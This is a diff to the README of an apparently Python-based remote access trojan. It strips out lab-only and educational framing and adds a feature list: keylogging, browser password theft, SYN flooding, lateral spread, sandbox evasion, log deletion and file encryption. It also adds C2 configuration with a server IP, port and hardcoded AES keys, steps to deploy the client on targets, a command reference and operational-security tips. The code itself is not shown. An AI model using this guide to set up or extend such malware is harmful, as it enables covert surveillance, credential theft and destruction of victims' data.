@@ -39,19 +39,6 @@ From a **defensive perspective**, this code is useful for understanding:
 * **Attack primitives (unsafe in production):** SYN flooding, log cleaning, directory encryption.
 * **Spreading techniques:** Simulated routines for propagation in a local network.
 
----
-
-## Educational Value
-
-By studying and experimenting with this code in a **sandboxed environment**, students and researchers can:
-
-* Explore how RATs implement encrypted communications.
-* Understand attacker tactics such as persistence, data theft, and lateral movement.
-* Learn how to recognize malicious behavior on networks and endpoints.
-* Practice writing defensive rules (IDS signatures, log monitoring, behavioral detection).
-* Identify insecure coding practices (hardcoded keys, missing authentication, unsafe command handling).
-
----
 
 ## Installation (Safe Setup in a Lab Environment)
 
@@ -75,16 +62,8 @@ By studying and experimenting with this code in a **sandboxed environment**, stu
    venv\Scripts\activate      # Windows
    pip install -r requirements.txt
    ```
-
-4. **Run inside the lab only**
-
-   * Start the server (`python server.py`).
-   * Connect test clients (VMs or simulated agents).
-   * Experiment only with machines you fully control.
-
 ---
 
-#
 ## Safe Testing Guidelines
 
 * Always run in a **sandbox** or isolated VM environment.
@@ -92,17 +71,6 @@ By studying and experimenting with this code in a **sandboxed environment**, stu
 * Monitor network traffic with tools like **Wireshark** or **tcpdump** to analyze encrypted C2.
 * Use endpoint monitoring tools to detect file writes, privilege checks, and suspicious processes.
 * Document your observations as if performing a **malware analysis report**.
-
----
-
-## Research Applications
-
-* **Cybersecurity education**: Teaching how RATs function internally.
-* **Red vs. Blue exercises**: Simulating attacker/defender scenarios in controlled labs.
-* **Malware reverse-engineering**: Comparing this open code to real-world RAT families.
-* **Defensive testing**: Developing detection rules for IDS/IPS, SIEMs, and EDR systems.
-
----
 
 ## Removed for Safety
 
@@ -117,5 +85,151 @@ Instead, replace them with **harmless placeholders** (e.g., fake credential data
 
 ---
 
-## Legal Notice
-* Legal: Unauthorized access, distribution, or deployment of this code is prohibited by law. Use only in **ethical, academic, or defensive security contexts**.
+## Legal Disclaimer
+
+This software is provided for:
+- Educational purposes
+- Authorized penetration testing
+- Security research
+- Red team exercises
+
+**You must have explicit permission** before deploying this tool on any system. The authors are not responsible for misuse of this software.
+
+### Surveillance Capabilities
+- Keylogging
+- Clipboard monitoring
+- System information gathering
+- Network information collection
+- Browser password extraction
+
+### Network Operations
+- Port scanning
+- Network host discovery
+- SYN flood attacks (DDoS)
+- Lateral movement techniques
+
+### Security Evasion
+- Polymorphic code execution
+- Anti-forensics (log deletion)
+- Sandbox detection
+- Persistence mechanisms
+
+### Encryption
+- AES-256 CBC encryption for all communications
+- File and directory encryption/decryption
+- String obfuscation
+
+## Architecture
+
+### Client (client.py)
+- Connects to C2 server
+- Executes commands received from server
+- Implements various surveillance and attack modules
+- Includes evasion techniques
+
+### Server (server.py)
+- Listens for client connections
+- Provides command interface
+- Manages multiple concurrent connections
+- Encrypted communication channel
+
+### Configuration
+
+1. **Update Server IP** in client.py:
+```python
+server('192.168.1.102', 4444)  # Change to your server IP
+```
+
+2. **AES Encryption Keys** (both client and server):
+```python
+AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
+AES_IV = b'ThisIsA16ByteIV!'
+```
+
+### Usage
+
+1. **Start the Server**:
+```bash
+python server.py
+```
+
+2. **Deploy Client** on target systems
+3. **Connect from Server** using the interactive menu
+
+## Command Reference
+
+### Center Commands
+- `targets` - List connected clients
+- `session [number]` - Connect to specific client
+- `sendall [command]` - Send command to all clients
+- `quit` - Exit server
+- `clear` - Clear screen
+- `help` - Show command help
+
+### Client Shell Commands
+- `exit` - Return to center
+- `check_priv` - Check privileges
+- `download/upload` - File transfer
+- `start_keylogger/stop_keylogger` - Keylogging
+- `encrypt_dir/decrypt_dir` - File encryption
+- `steal_creds` - Extract browser passwords
+- `port_scan` - Network scanning
+- `spread` - Lateral movement
+- `anti_forensics` - Delete logs
+
+## Security Features
+
+### Communication Security
+- All traffic encrypted with AES-256-CBC
+- Base64 encoding for data transmission
+- JSON format for command structure
+
+### Evasion Techniques
+- Polymorphic code generation
+- Sandbox environment detection
+- Anti-debugging measures
+- Persistence through startup and registry
+
+## Important Notes
+
+### Detection Risks
+This tool may be detected by:
+- Antivirus software
+- EDR solutions
+- Network monitoring tools
+- Behavioral analysis systems
+
+### Operational Security
+- Change default encryption keys
+- Use secure communication channels
+- Implement proper access controls
+- Monitor for unauthorized use
+
+## Educational Value
+
+This project demonstrates:
+- Remote administration techniques
+- Network security concepts
+- Cryptography implementation
+- System programming
+- Ethical hacking methodologies
+
+## Learning Objectives
+
+- Understand RAT architecture
+- Learn about persistence mechanisms
+- Study encryption in malware
+- Analyze detection evasion techniques
+- Explore ethical hacking tools
+
+## Contributing
+
+This is an educational project. Contributions should focus on:
+- Improving documentation
+- Enhancing educational value
+- Adding security features
+- Bug fixes and optimization
+
+
+
+## For educational purposes only. Users are responsible for complying with all applicable laws.
